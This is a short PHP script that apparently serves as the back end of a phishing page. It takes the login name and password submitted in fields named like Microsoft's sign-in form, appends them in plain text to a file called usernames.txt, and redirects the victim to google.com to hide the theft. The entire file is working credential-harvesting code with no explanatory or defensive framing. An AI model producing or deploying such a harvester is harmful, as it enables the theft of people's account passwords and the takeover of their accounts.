<?php

file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
